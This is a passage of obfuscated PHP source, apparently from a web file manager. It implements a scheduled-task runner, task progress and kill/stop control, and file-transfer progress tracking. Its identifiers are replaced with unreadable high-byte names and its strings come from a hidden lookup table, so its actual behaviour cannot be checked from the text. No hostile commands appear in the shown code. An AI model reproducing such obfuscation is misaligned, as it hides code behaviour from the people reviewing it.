$Ã®¦ß¨ã[$ìñî„ğš[1625]] != $ìñî„ğš[88]) { continue; } if (!self::taskTimeCheck($Ã®¦ß¨ã)) { continue; } self::taskRun($Ã®¦ß¨ã); } Hook::trigger($ìñî„ğš[1626]); self::taskQueueRun($Õ“¹¬¾ë); } private static function taskQueueRun($«œèš®²) { $’ÙÈÇŠ² = 10; while (!0) { $ƒ‰İíùü = TaskQueue::run(); if ($ƒ‰İíùü === !1) { break; } if (timeFloat() - $«œèš®² >= $’ÙÈÇŠ²) { break; } } } private static function taskTimeCheck($‘ÁĞÍµ‰) { $—€Å“‚Á =& $_SERVER[ßğøİ]; $áœ®ŠÎ = json_decode($‘ÁĞÍµ‰[$—€Å“‚Á[203]], !0); $Öº¸²ÂÈ = intval($‘ÁĞÍµ‰[$—€Å“‚Á[1615]]); $ËÈèŸÁÚ = strtotime($—€Å“‚Á[1627] . $áœ®ŠÎ[$—€Å“‚Á[1628]] . $—€Å“‚Á[1629]) - strtotime($—€Å“‚Á[1630]); $½›À‹Ğ = time() - strtotime(date($—€Å“‚Á[1631]) . $—€Å“‚Á[1632]); $úƒ¢¸Õõ = $½›À‹Ğ >= $ËÈèŸÁÚ && $½›À‹Ğ <= $ËÈèŸÁÚ + 3600; switch ($áœ®ŠÎ[$—€Å“‚Á[33]]) { case $—€Å“‚Á[1633]: if (time() - $Öº¸²ÂÈ < 3600 * 24 * 30) { return !1; } if ($áœ®ŠÎ[$—€Å“‚Á[1633]] == date($—€Å“‚Á[1634]) && $úƒ¢¸Õõ) { return !0; } break; case $—€Å“‚Á[1635]: if (time() - $Öº¸²ÂÈ < 3600 * 24 * 7) { return !1; } $ñ£É¥Æ­ = date($—€Å“‚Á[1636]) == 0 ? 7 : date($—€Å“‚Á[1636]); if ($áœ®ŠÎ[$—€Å“‚Á[1635]] == $ñ£É¥Æ­ && $úƒ¢¸Õõ) { return !0; } break; case $—€Å“‚Á[1628]: if (time() - $Öº¸²ÂÈ < 3600 * 24) { return !1; } if ($úƒ¢¸Õõ) { return !0; } break; case $—€Å“‚Á[1637]: if (time() - $Öº¸²ÂÈ >= floatval($áœ®ŠÎ[$—€Å“‚Á[1637]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $¨şÑã¤… =& $_SERVER[ßğøİ]; static $”ìàóÙ… = 0; $ÖÃà‡©› = 300; if (!$”ìàóÙ…) { $”ìàóÙ… = time(); } if (time() - $”ìàóÙ… < $ÖÃà‡©›) { return; } $”ìàóÙ… = time(); $ˆÃÎî—» = Model($¨şÑã¤…[513])->db($¨şÑã¤…[12]); if ($ˆÃÎî—») { $ˆÃÎî—»->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($¨şÑã¤…[1638], $¨şÑã¤…[1639]); die; } } public static function taskRun($ã³›¬ÀÕ) { $±ÌĞ öï =& $_SERVER[ßğøİ]; self::log($±ÌĞ öï[1640] . $ã³›¬ÀÕ[$±ÌĞ öï[399]] . $±ÌĞ öï[1641] . $ã³›¬ÀÕ[$±ÌĞ öï[32]] . $±ÌĞ öï[1642] . $ã³›¬ÀÕ[$±ÌĞ öï[1643]]); Model($±ÌĞ öï[1624])->run($ã³›¬ÀÕ[$±ÌĞ öï[399]]); $øŠ›ÚÂ— = timeFloat(); $º¥§ì… = $±ÌĞ öï[12]; switch ($ã³›¬ÀÕ[$±ÌĞ öï[33]]) { case $±ÌĞ öï[307]: $¤Şæç›° = url_request($ã³›¬ÀÕ[$±ÌĞ öï[1643]], $±ÌĞ öï[230], !1, !1, !1, !1, 10); if ($¤Şæç›°[$±ÌĞ öï[747]]) { $º¥§ì… = strlen($¤Şæç›°[$±ÌĞ öï[1193]]); } break; case $±ÌĞ öï[229]: $º¥§ì… = Hook::apply($ã³›¬ÀÕ[$±ÌĞ öï[1643]]); default: break; } Model($±ÌĞ öï[1644])->add(array($±ÌĞ öï[1645] => $±ÌĞ öï[12], $±ÌĞ öï[1646] => $±ÌĞ öï[197], $±ÌĞ öï[33] => $±ÌĞ öï[1647] . $ã³›¬ÀÕ[$±ÌĞ öï[399]], $±ÌĞ öï[1648] => json_encode(array($±ÌĞ öï[32] => $ã³›¬ÀÕ[$±ÌĞ öï[32]], $±ÌĞ öï[1649] => timeFloat() - $øŠ›ÚÂ—, $±ÌĞ öï[293] => $º¥§ì…)))); $ÙÕÓ²£ = $º¥§ì… ? $±ÌĞ öï[1650] . $º¥§ì… : $±ÌĞ öï[12]; self::log($±ÌĞ öï[1651] . $ã³›¬ÀÕ[$±ÌĞ öï[399]] . $±ÌĞ öï[164] . $ÙÕÓ²£); return !0; } private static function valueGet($”¾ƒè‹‡) { $¾›ìÜÄ· =& $_SERVER[ßğøİ]; $íªïˆ½ = $¾›ìÜÄ·[1652]; $¾¹‹Šº = Model($¾›ìÜÄ·[435])->get($”¾ƒè‹‡, $íªïˆ½); if (is_null($¾¹‹Šº)) { Model($¾›ìÜÄ·[435])->set($¾›ìÜÄ·[747], $¾›ìÜÄ·[88], $íªïˆ½); Model($¾›ìÜÄ·[435])->set($¾›ìÜÄ·[1614], $¾›ìÜÄ·[197], $íªïˆ½); $¾¹‹Šº = Model($¾›ìÜÄ·[435])->get($”¾ƒè‹‡, $íªïˆ½); } return $¾¹‹Šº; } private static function valueSet($¯‘²Üá°, $£§¬øå†) { $À½ú ß¡ =& $_SERVER[ßğøİ]; $´ïûÜ¬ò = $À½ú ß¡[1653]; CacheLock::lock($´ïûÜ¬ò); $†ª±éÅÎ = Model($À½ú ß¡[435])->set($¯‘²Üá°, $£§¬øå†, $À½ú ß¡[1652]); CacheLock::unlock($´ïûÜ¬ò); return $†ª±éÅÎ; } protected static function log($¸¹Ü“îÚ) { write_log($¸¹Ü“îÚ, $_SERVER[ßğøİ][1639]); } private static function cacheClear() { $µ¬Â† =& $_SERVER[ßğøİ]; Cache::clearMemory(Model($µ¬Â†[435])->cacheKey($µ¬Â†[1652])); Cache::clearMemory(Model($µ¬Â†[435])->cacheKey($µ¬Â†[1654])); Model($µ¬Â†[1624])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\164\157\160"; const STATYS_RUNNING = "\162\x75\x6e\x6e\x69\156\147"; const STATYS_KILL = "\153\x69\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($äƒÂ‘¿Í, $íî‚œ¨± = '', $Áö’ğ¦¦ = 0, $ì˜ÛèŠ = '') { $®†·÷£± =& $_SERVER[ßğøİ]; if (self::get($äƒÂ‘¿Í)) { return; } $this->task = array($®†·÷£±[399] => $äƒÂ‘¿Í, $®†·÷£±[1655] => USER_ID, $®†·÷£±[1554] => $ì˜ÛèŠ, $®†·÷£±[33] => $íî‚œ¨±, $®†·÷£±[1064] => $®†·÷£±[12], $®†·÷£±[783] => $Áö’ğ¦¦, $®†·÷£±[1656] => 0, $®†·÷£±[1657] => 0, $®†·÷£±[1658] => 0, $®†·÷£±[1659] => timeFloat(), $®†·÷£±[1660] => 0, $®†·÷£±[1661] => 0, $®†·÷£±[1662] => 0, $®†·÷£±[1663] => 0, $®†·÷£±[747] => $®†·÷£±[1614]); $GLOBALS[$®†·÷£±[1664]] = 1; Hook::bind($®†·÷£±[1619], array($this, $®†·÷£±[1665])); Hook::bind($®†·÷£±[1666], array($this, $®†·÷£±[1667])); $this->startAfter(); Hook::trigger($®†·÷£±[1668], $this->task); $this->task[$®†·÷£±[1661]] = timeFloat(); } public function end() { $‹´ÀšÎÊ =& $_SERVER[ßğøİ]; if (!$this->task) { return; } if ($this->task[$‹´ÀšÎÊ[1661]]) { self::valueSet($this->task[$‹´ÀšÎÊ[399]], !1); } $Ğ—šĞ½í = timeFloat() - $this->task[$‹´ÀšÎÊ[1659]]; self::log($‹´ÀšÎÊ[1669] . $this->task[$‹´ÀšÎÊ[399]] . $‹´ÀšÎÊ[1670] . $Ğ—šĞ½í . $‹´ÀšÎÊ[1671]); Hook::unbind($‹´ÀšÎÊ[1619], array($this, $‹´ÀšÎÊ[1665])); Hook::unbind($‹´ÀšÎÊ[1666], array($this, $‹´ÀšÎÊ[1667])); $this->endAfter(); $this->task = !1; } public function update($â‡‰§· = 0, $àßªª½Ÿ = false) { $Âå³‰¸ª =& $_SERVER[ßğøİ]; $óä•„Ç‚ =& $this->task; if (!$óä•„Ç‚) { return; } $óä•„Ç‚[$Âå³‰¸ª[1656]] += $â‡‰§·; $óä•„Ç‚[$Âå³‰¸ª[1660]] = timeFloat(); if ($óä•„Ç‚[$Âå³‰¸ª[783]]) { if ($óä•„Ç‚[$Âå³‰¸ª[783]] < $óä•„Ç‚[$Âå³‰¸ª[1656]]) { $óä•„Ç‚[$Âå³‰¸ª[783]] = $óä•„Ç‚[$Âå³‰¸ª[1656]]; } $‚Âˆ¬±ç = timeFloat() - $óä•„Ç‚[$Âå³‰¸ª[1659]] - $óä•„Ç‚[$Âå³‰¸ª[1662]]; if ($‚Âˆ¬±ç <= 0) { $‚Âˆ¬±ç = 0.001; } $óä•„Ç‚[$Âå³‰¸ª[1657]] = $óä•„Ç‚[$Âå³‰¸ª[1656]] / $óä•„Ç‚[$Âå³‰¸ª[783]]; $óä•„Ç‚[$Âå³‰¸ª[1658]] = $óä•„Ç‚[$Âå³‰¸ª[1656]] / $‚Âˆ¬±ç; if ($óä•„Ç‚[$Âå³‰¸ª[1657]] > 0) { $óä•„Ç‚[$Âå³‰¸ª[1663]] = $‚Âˆ¬±ç * (1 - $óä•„Ç‚[$Âå³‰¸ª[1657]]) / $óä•„Ç‚[$Âå³‰¸ª[1657]]; } $óä•„Ç‚[$Âå³‰¸ª[1663]] = $óä•„Ç‚[$Âå³‰¸ª[1663]] <= 0 ? 0 : $óä•„Ç‚[$Âå³‰¸ª[1663]]; } $this->updateAfter(); $¹²Ü²†» = 0.2; if (timeFloat() - $óä•„Ç‚[$Âå³‰¸ª[1661]] < $¹²Ü²†» && !$àßªª½Ÿ) { return; } $ğ÷ãÃÖÕ = self::get($óä•„Ç‚[$Âå³‰¸ª[399]]); $––‚¯ˆš = $ğ÷ãÃÖÕ[$Âå³‰¸ª[747]]; if ($––‚¯ˆš == self::STATYS_KILL) { $®·Ç—Š» = array($Âå³‰¸ª[1672] => LNG($Âå³‰¸ª[1673]), $Âå³‰¸ª[1191] => !1); Cache::set($Âå³‰¸ª[1674] . $this->task[$Âå³‰¸ª[399]], $®·Ç—Š», 30); $this->onKill(); $this->end(); die; } else { if ($––‚¯ˆš == self::STATYS_STOP) { $‡è›Åá£ = 2; $ğ÷ãÃÖÕ[$Âå³‰¸ª[1662]] += $‡è›Åá£; self::valueSet($óä•„Ç‚[$Âå³‰¸ª[399]], $ğ÷ãÃÖÕ); sleep($‡è›Åá£); $this->update(); return; } } $óä•„Ç‚[$Âå³‰¸ª[747]] = $––‚¯ˆš ? $––‚¯ˆš : $óä•„Ç‚[$Âå³‰¸ª[747]]; $óä•„Ç‚[$Âå³‰¸ª[1662]] = $ğ÷ãÃÖÕ[$Âå³‰¸ª[1662]] ? $ğ÷ãÃÖÕ[$Âå³‰¸ª[1662]] : 0; $óä•„Ç‚[$Âå³‰¸ª[1661]] = timeFloat(); Hook::trigger($Âå³‰¸ª[1675], $óä•„Ç‚); self::valueSet($óä•„Ç‚[$Âå³‰¸ª[399]], $óä•„Ç‚); } public function onKillSet($øƒ¡ü, $Ìã‹ëô = array()) { $this->onKillCall = array($øƒ¡ü, $Ìã‹ëô); } public function onKill() { $÷¯Ä¶Æ¬ =& $_SERVER[ßğøİ]; self::log($÷¯Ä¶Æ¬[1669] . $this->task[$÷¯Ä¶Æ¬[399]] . $÷¯Ä¶Æ¬[1676]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($® ƒô›‚) { $³‚”™ß =& $_SERVER[ßğøİ]; Cache::set($³‚”™ß[1674] . $this->task[$³‚”™ß[399]], $® ƒô›‚, 60); return $® ƒô›‚; } public static function get($Ş¼êæ…ë) { $ãñéİ¯ =& $_SERVER[ßğøİ]; $íè—»°½ = self::valueGet($Ş¼êæ…ë); if (is_array($íè—»°½) && $íè—»°½[$ãñéİ¯[1677]]) { $óô”â¢º = ActionApply($íè—»°½[$ãñéİ¯[1677]], array($íè—»°½)); $íè—»°½ = is_array($óô”â¢º) ? $óô”â¢º : $íè—»°½; } return $íè—»°½; } public static function listData() { $ÏœäÙÖ = self::valueGet(); return array_sort_by($ÏœäÙÖ, $_SERVER[ßğøİ][1659], !0); } public static function kill($§ßËÃÖ ) { return self::changeStatus($§ßËÃÖ , self::STATYS_KILL); } public static function stop($éïà™‡Ô) { return self::changeStatus($éïà™‡Ô, self::STATYS_STOP); } public static function restart($“ÔæÏøà) { return self::changeStatus($“ÔæÏøà, self::STATYS_RUNNING); } public static function killAll() { $÷¡–²½Ó =& $_SERVER[ßğøİ]; $Ú“úÇû = self::listData(); foreach ($Ú“úÇû as $°©‘„ç) { self::kill($°©‘„ç[$÷¡–²½Ó[399]]); } sleep(2); foreach ($Ú“úÇû as $°©‘„ç) { self::valueSet($°©‘„ç[$÷¡–²½Ó[399]], !1); } } private static function changeStatus($Ğ¾İšöè, $Ÿê½½Úğ) { $Å›¶èŒ¡ =& $_SERVER[ßğøİ]; $Õ¦Ù©­… = self::valueGet($Ğ¾İšöè); if (!$Õ¦Ù©­…) { return !1; } $Õ¦Ù©­…[$Å›¶èŒ¡[747]] = $Ÿê½½Úğ; self::valueSet($Ğ¾İšöè, $Õ¦Ù©­…); self::log($Å›¶èŒ¡[1678] . $Õ¦Ù©­…[$Å›¶èŒ¡[399]] . $Å›¶èŒ¡[1679] . $Ÿê½½Úğ); return !0; } public static function valueGet($’òŞ¥Ù„ = false) { $‹®Øğ³¤ =& $_SERVER[ßğøİ]; if ($’òŞ¥Ù„) { $ÈÔúÍôÍ = Model($‹®Øğ³¤[447])->where(array($‹®Øğ³¤[94] => $’òŞ¥Ù„, $‹®Øğ³¤[33] => $‹®Øğ³¤[1071]))->find(); return $ÈÔúÍôÍ ? json_decode($ÈÔúÍôÍ[$‹®Øğ³¤[374]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ ¦¤Ì˜˜ = false) { $âˆ¬Åù— =& $_SERVER[ßğøİ]; $õÇ‰îÉÍ = array($âˆ¬Åù—[33] => $âˆ¬Åù—[1071]); if ($ ¦¤Ì˜˜) { $õÇ‰îÉÍ[$âˆ¬Åù—[1655]] = $ ¦¤Ì˜˜; } $ÚÓÁë¸ì = Model($âˆ¬Åù—[447])->where($õÇ‰îÉÍ)->select(); $ÚÓÁë¸ì = $ÚÓÁë¸ì ? $ÚÓÁë¸ì : array(); foreach ($ÚÓÁë¸ì as $‹Â—ç¬Ù => $È¤Ğ·é¹) { $ÚÓÁë¸ì[$‹Â—ç¬Ù] = json_decode($È¤Ğ·é¹[$âˆ¬Åù—[374]], !0); } return $ÚÓÁë¸ì; } public static function valueSet($Û¨øÛ‘†, $‚¾í¢ìÜ) { $ş˜°à¡ =& $_SERVER[ßğøİ]; if (!$‚¾í¢ìÜ) { return Model($ş˜°à¡[447])->where(array($ş˜°à¡[94] => $Û¨øÛ‘†, $ş˜°à¡[33] => $ş˜°à¡[1071]))->delete(); } $Ï–Üˆ„ê = json_encode($‚¾í¢ìÜ); if (!$Ï–Üˆ„ê) { ob_start(); var_dump($‚¾í¢ìÜ); $£°¸áÃò = ob_get_clean(); self::log($ş˜°à¡[1680] . json_encode_force($£°¸áÃò)); } if (!$Û¨øÛ‘† || !$‚¾í¢ìÜ[$ş˜°à¡[399]]) { return !1; } $ÉÉÙ”·Í = array($ş˜°à¡[33] => $ş˜°à¡[1071], $ş˜°à¡[1655] => USER_ID, $ş˜°à¡[94] => $Û¨øÛ‘†, $ş˜°à¡[374] => $Ï–Üˆ„ê); $™ˆÀ«÷ß = $ş˜°à¡[1681]; CacheLock::lock($™ˆÀ«÷ß); Model($ş˜°à¡[447])->add($ÉÉÙ”·Í, array(), !0); CacheLock::unlock($™ˆÀ«÷ß); } public static function log($¨¡­®³à) { if (!GLOBAL_DEBUG) { return; } write_log($¨¡­®³à, $_SERVER[ßğøİ][1682]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ÙéúĞŠ• =& $_SERVER[ßğøİ]; $Çï·Ø =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ÙéúĞŠ•[1683], array($this, $ÙéúĞŠ•[1684])); Hook::bind($ÙéúĞŠ•[1215], array($this, $ÙéúĞŠ•[1685])); Hook::bind($ÙéúĞŠ•[1686], array($this, $ÙéúĞŠ•[1687])); Hook::bind($ÙéúĞŠ•[604], array($this, $ÙéúĞŠ•[1688])); Hook::bind($ÙéúĞŠ•[605], array($this, $ÙéúĞŠ•[1689])); Hook::bind($ÙéúĞŠ•[610], array($this, $ÙéúĞŠ•[1690])); Hook::bind($ÙéúĞŠ•[611], array($this, $ÙéúĞŠ•[1691])); Hook::bind($ÙéúĞŠ•[607], array($this, $ÙéúĞŠ•[1692])); Hook::bind($ÙéúĞŠ•[608], array($this, $ÙéúĞŠ•[1693])); Hook::bind($ÙéúĞŠ•[574], array($this, $ÙéúĞŠ•[1694])); Hook::bind($ÙéúĞŠ•[571], array($this, $ÙéúĞŠ•[1694])); Hook::bind($ÙéúĞŠ•[576], array($this, $ÙéúĞŠ•[1694])); Hook::bind($ÙéúĞŠ•[578], array($this, $ÙéúĞŠ•[1694])); Hook::bind($ÙéúĞŠ•[580], array($this, $ÙéúĞŠ•[1694])); Hook::bind($ÙéúĞŠ•[1695], array($this, $ÙéúĞŠ•[1696])); Hook::bind($ÙéúĞŠ•[597], array($this, $ÙéúĞŠ•[1697])); $this->sourceModelCopyFlag = !1; Hook::bind($ÙéúĞŠ•[1698], array($this, $ÙéúĞŠ•[1699])); Hook::bind($ÙéúĞŠ•[1700], array($this, $ÙéúĞŠ•[1701])); Hook::bind($ÙéúĞŠ•[1702], array($this, $ÙéúĞŠ•[1703])); $Çï·Ø[$ÙéúĞŠ•[1704]] = LNG($ÙéúĞŠ•[1705]); $Çï·Ø[$ÙéúĞŠ•[1706]] = 0; $Çï·Ø[$ÙéúĞŠ•[1707]] = 0; $Çï·Ø[$ÙéúĞŠ•[1064]] = $ÙéúĞŠ•[12]; $Çï·Ø[$ÙéúĞŠ•[1708]] = $ÙéúĞŠ•[12]; $Çï·Ø[$ÙéúĞŠ•[1709]] = 0; $Çï·Ø[$ÙéúĞŠ•[1710]] = 0; $Çï·Ø[$ÙéúĞŠ•[1711]] = 0; if (!$Çï·Ø[$ÙéúĞŠ•[1554]]) { $Çï·Ø[$ÙéúĞŠ•[1554]] = LNG($ÙéúĞŠ•[1712]); } } protected function endAfter() { $ Á²õä¿ =& $_SERVER[ßğøİ]; Hook::unbind($ Á²õä¿[1683], array($this, $ Á²õä¿[1684])); Hook::unbind($ Á²õä¿[1215], array($this, $ Á²õä¿[1685])); Hook::unbind($ Á²õä¿[1686], array($this, $ Á²õä¿[1687])); Hook::unbind($ Á²õä¿[604], array($this, $ Á²õä¿[1688])); Hook::unbind($ Á²õä¿[605], array($this, $ Á²õä¿[1689])); Hook::unbind($ Á²õä¿[610], array($this, $ Á²õä¿[1690])); Hook::unbind($ Á²õä¿[611], array($this, $ Á²õä¿[1691])); Hook::unbind($ Á²õä¿[607], array($this, $ Á²õä¿[1692])); Hook::unbind($ Á²õä¿[608], array($this, $ Á²õä¿[1693])); Hook::unbind($ Á²õä¿[574], array($this, $ Á²õä¿[1694])); Hook::unbind($ Á²õä¿[571], array($this, $ Á²õä¿[1694])); Hook::unbind($ Á²õä¿[576], array($this, $ Á²õä¿[1694])); Hook::unbind($ Á²õä¿[578], array($this, $ Á²õä¿[1694])); Hook::unbind($ Á²õä¿[580], array($this, $ Á²õä¿[1694])); Hook::unbind($ Á²õä¿[1695], array($this, $ Á²õä¿[1696])); Hook::unbind($ Á²õä¿[597], array($this, $ Á²õä¿[1697])); Hook::unbind($ Á²õä¿[1698], array($this, $ Á²õä¿[1699])); Hook::unbind($ Á²õä¿[1700], array($this, $ Á²õä¿[1701])); Hook::unbind($ Á²õä¿[1702], array($this, $ Á²õä¿[1703])); } public function copyMoveStart($´±Èí×ó, $éÍ¶ë•, $íëù‘Åü, $´÷¬ûìü) { $€ŸØÑô =& $_SERVER[ßğøİ]; self::log($€ŸØÑô[1713] . $éÍ¶ë• . $€ŸØÑô[70] . $´÷¬ûìü); $‘Ù–š… = rtrim(TEMP_FILES, $€ŸØÑô[8]); if (substr($éÍ¶ë•, 0, strlen($‘Ù–š…)) == $‘Ù–š…) { return; } if (substr($´÷¬ûìü, 0, strlen($‘Ù–š…)) == $‘Ù–š…) { return; } $Ù¤öˆùò =& $this->task; $Ù¤öˆùò[$€ŸØÑô[1714]] = KodIO::transferType($´±Èí×ó, $íëù‘Åü); $this->update(); } public function updateAfter() { $º¤ü† =& $_SERVER[ßğøİ]; $†«Œ¹ù =& $this->task; if (!$†«Œ¹ù[$º¤ü†[760]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($†«Œ¹ù[$º¤ü†[1714]] == $º¤ü†[1304]) { return; } self::updateTask($†«Œ¹ù); } private static function updateTask(&$ØŞ©Øİ) { $ÜŸµÃÆ =& $_SERVER[ßğøİ]; if ($ØŞ©Øİ[$ÜŸµÃÆ[1714]] == $ÜŸµÃÆ[1199] || $ØŞ©Øİ[$ÜŸµÃÆ[1714]] == $ÜŸµÃÆ[107]) { if ($ØŞ©Øİ[$ÜŸµÃÆ[1708]]) { $ØŞ©Øİ[$ÜŸµÃÆ[1711]] = $ØŞ©Øİ[$ÜŸµÃÆ[1710]] + $ØŞ©Øİ[$ÜŸµÃÆ[1707]]; } } else { if ($ØŞ©Øİ[$ÜŸµÃÆ[1714]] == $ÜŸµÃÆ[1305]) { if ($ØŞ©Øİ[$ÜŸµÃÆ[1708]] == $ÜŸµÃÆ[1199]) { $ØŞ©Øİ[$ÜŸµÃÆ[1711]] = $ØŞ©Øİ[$ÜŸµÃÆ[1710]] + $ØŞ©Øİ[$ÜŸµÃÆ[1707]] * 0.5; } else { if ($ØŞ©Øİ[$ÜŸµÃÆ[1708]] == $ÜŸµÃÆ[107]) { $ØŞ©Øİ[$ÜŸµÃÆ[1711]] = $ØŞ©Øİ[$ÜŸµÃÆ[1710]] + $ØŞ©Øİ[$ÜŸµÃÆ[1706]] * 0.5 + $ØŞ©Øİ[$ÜŸµÃÆ[1707]] * 0.5; } } } } $ØŞ©Øİ[$ÜŸµÃÆ[1657]] = $ØŞ©Øİ[$ÜŸµÃÆ[1711]] / $ØŞ©Øİ[$ÜŸµÃÆ[760]]; if ($ØŞ©Øİ[$ÜŸµÃÆ[1657]] > 0) { $¯ìó¥Ğ¿ = timeFloat() - $ØŞ©Øİ[$ÜŸµÃÆ[1659]] - $ØŞ©Øİ[$ÜŸµÃÆ[1662]]; $ØŞ©Øİ[$ÜŸµÃÆ[1663]] = $¯ìó¥Ğ¿ * (1 - $ØŞ©Øİ[$ÜŸµÃÆ[1657]]) / $ØŞ©Øİ[$ÜŸµÃÆ[1657]]; } } public function addPath($§¦ÓÅ½) { $÷ŠŸİö =& $_SERVER[ßğøİ]; if (!$§¦ÓÅ½) { return; } $ıÀ•ñú… =& $this->task; $î¬¾×¾Ÿ = IO::infoWithChildren($§¦ÓÅ½); $‡¢ ™Ø = $ıÀ•ñú…[$÷ŠŸİö[1715]] ? $ıÀ•ñú…[$÷ŠŸİö[1715]][$÷ŠŸİö[1716]] : 0; $ıÀ•ñú…[$÷ŠŸİö[1715]] = array($÷ŠŸİö[1716] => $‡¢ ™Ø + 1, $÷ŠŸİö[420] => $î¬¾×¾Ÿ[$÷ŠŸİö[32]], $÷ŠŸİö[84] => $î¬¾×¾Ÿ[$÷ŠŸİö[84]], $÷ŠŸİö[519] => $î¬¾×¾Ÿ[$÷ŠŸİö[519]] ? $î¬¾×¾Ÿ[$÷ŠŸİö[519]] : $î¬¾×¾Ÿ[$÷ŠŸİö[84]]); if ($î¬¾×¾Ÿ[$÷ŠŸİö[33]] == $÷ŠŸİö[199]) { $ıÀ•ñú…[$÷ŠŸİö[783]] += 1; } else { $ıÀ•ñú…[$÷ŠŸİö[783]] += $î¬¾×¾Ÿ[$÷ŠŸİö[79]][$÷ŠŸİö[77]]; if ($î¬¾×¾Ÿ[$÷ŠŸİö[402]]) { $ıÀ•ñú…[$÷ŠŸİö[783]] += $î¬¾×¾Ÿ[$÷ŠŸİö[79]][$÷ŠŸİö[78]] + 1; } } $ıÀ•ñú…[$÷ŠŸİö[760]] += $î¬¾×¾Ÿ[$÷ŠŸİö[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($§Ãï¼Œà) { } public function sourceAddHashEnd($°øÚ³š·) { } public function sourceAddFileStart($€¶ş¾ı’) { $¾Æ¡û¡› =& $_SERVER[ßğøİ]; $ üµÜğŸ =& $this->task; $ üµÜğŸ[$¾Æ¡û¡›[1706]] = $€¶ş¾ı’[$¾Æ¡û¡›[76]]; $ üµÜğŸ[$¾Æ¡û¡›[1704]] = $€¶ş¾ı’[$¾Æ¡û¡›[32]]; $ üµÜğŸ[$¾Æ¡û¡›[1064]] = $€¶ş¾ı’[$¾Æ¡û¡›[32]]; $ üµÜğŸ[$¾Æ¡û¡›[1717]] = $€¶ş¾ı’[$¾Æ¡û¡›[84]]; $this->update(); } public function sourceAddFileEnd($ôàñ­á) { $ŞÙ­‘¶ =& $_SERVER[ßğøİ]; $Åˆñ‘“‡ =& $this->task; $Åˆñ‘“‡[$ŞÙ­‘¶[1711]] += $ôàñ­á[$ŞÙ­‘¶[76]]; $Åˆñ‘“‡[$ŞÙ­‘¶[1717]] = $ôàñ­á[$ŞÙ­‘¶[84]]; $this->update(1); } public function copyFileStart($Ô—Ş§İ, $–óüåğ, $šûÛù©, $¡¸‘ê¸, $¶âßˆÒ, $Ó™óä‡Ğ) { $¬‡Øè‹¾ =& $_SERVER[ßğøİ]; $´Áâ„Áè = $¶âßˆÒ; if ($´Áâ„Áè == $GLOBALS[$¬‡Øè‹¾[1718]]) { $´Áâ„Áè = $GLOBALS[$¬‡Øè‹¾[1719]]; } $GLOBALS[$¬‡Øè‹¾[1719]] = $¶âßˆÒ; $GLOBALS[$¬‡Øè‹¾[1718]] = $Ó™óä‡Ğ; $ŒÍøÁâÉ =& $this->task; $ŒÍøÁâÉ[$¬‡Øè‹¾[1704]] = $´Áâ„Áè; $ŒÍøÁâÉ[$¬‡Øè‹¾[1706]] = (int) $Ô—Ş§İ->size($–óüåğ); $ŒÍøÁâÉ[$¬‡Øè‹¾[1707]] = 0; $ŒÍøÁâÉ[$¬‡Øè‹¾[1064]] = $¬‡Øè‹¾[12]; $ŒÍøÁâÉ[$¬‡Øè‹¾[1708]] = $¬‡Øè‹¾[12]; $ŒÍøÁâÉ[$¬‡Øè‹¾[1709]] = 0; $™éâË– = $ŒÍøÁâÉ[$¬‡Øè‹¾[1706]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ŒÍøÁâÉ[$¬‡Øè‹¾[399]] . $¬‡Øè‹¾[1720]); if ($™éâË– && file_exists(get_path_father($¡¸‘ê¸))) { Cache::set($ŒÍøÁâÉ[$¬‡Øè‹¾[399]] . $¬‡Øè‹¾[1720], $¡¸‘ê¸); $ŒÍøÁâÉ[$¬‡Øè‹¾[1677]] = array($¬‡Øè‹¾[1721], $¬‡Øè‹¾[1722]); } $this->update(0, $™éâË–); } public static function updateCopyLocalFileSize($åæà¬Âã) { $¾â’ÜÅ =& $_SERVER[ßğøİ]; $¼¥¹îÕ = Cache::get($åæà¬Âã[$¾â’ÜÅ[399]] . $¾â’ÜÅ[1720]); if (!$¼¥¹îÕ || !file_exists($¼¥¹îÕ)) { return $åæà¬Âã; } $åæà¬Âã[$¾â’ÜÅ[1707]] = @filesize($¼¥¹îÕ); $åæà¬Âã[$¾â’ÜÅ[1711]] += $åæà¬Âã[$¾â’ÜÅ[1707]]; self::updateTask($åæà¬Âã); return $åæà¬Âã; } public function copyFileEnd($ÛçùİŸ‚, $ø“…øè…, $½™âœğê, $ÚïøÅˆ, $Æ®½·©‰, $î’ÑÄñœ) { $²€šëÆ“ =& $_SERVER[ßğøİ]; $¾¿¤®Œ =& $this->task; $¾¿¤®Œ[$²€šëÆ“[1707]] = $¾¿¤®Œ[$²€šëÆ“[1706]]; $¾¿¤®Œ[$²€šëÆ“[1708]] = $²€šëÆ“[12]; unset($¾¿¤®Œ[$²€šëÆ“[1677]]); if ($Æ®½·©‰ == $¾¿¤®Œ[$²€šëÆ“[1704]]) { $¾¿¤®Œ[$²€šëÆ“[1710]] += $¾¿¤®Œ[$²€šëÆ“[1706]]; $¾¿¤®Œ[$²€šëÆ“[1711]] = $¾¿¤®Œ[$²€šëÆ“[1710]]; $»òäí½ğ = 1; if (isset($¾¿¤®Œ[$²€šëÆ“[1717]]) && $¾¿¤®Œ[$²€šëÆ“[1717]] == $ø“…øè…) { $»òäí½ğ = 0; } $this->update($»òäí½ğ); } else { $this->update(); $¾¿¤®Œ[$²€šëÆ“[1707]] = 0; } Cache::remove($¾¿¤®Œ[$²€šëÆ“[399]] . $²€šëÆ“[1720]); self::log($²€šëÆ“[1723] . $ø“…øè… . $²€šëÆ“[70] . $ÚïøÅˆ . $²€šëÆ“[231] . $Æ®½·©‰ . $²€šëÆ“[1724] . $¾¿¤®Œ[$²€šëÆ“[1704]]); } public function updateFileEnd($İûõÁİ‘, $ùóŠ×“ş) { $ÕÌÙşú =& 